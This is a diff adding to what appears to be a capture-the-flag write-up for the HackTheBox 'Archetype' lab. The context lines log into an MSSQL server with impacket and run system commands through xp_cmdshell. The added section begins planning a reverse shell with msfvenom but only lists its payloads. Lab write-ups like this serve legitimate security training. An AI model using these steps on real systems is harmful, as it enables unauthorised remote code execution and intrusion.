@@ -69,4 +69,13 @@ mssqlclient.py ARCHETYPE/sql_svc:{Password}@10.129.95.187 -windows-auth
   - xp_cmdshell dir --> Shows directory
   - xp_cmdshell "powershell -c cd C:/; pwd" --> First changes dir to C:/ then shows pwd
 
+**Generate Reverse Shell**
+
+We can try **msfvenom** tool to generate the payload for the reverse shell. 
+
+![image](https://user-images.githubusercontent.com/99097743/169732063-60f5b6b4-3640-4197-92d5-8c265a02d9c7.png)
+
+```sh
+msfvenom -l payloads 
+```
 
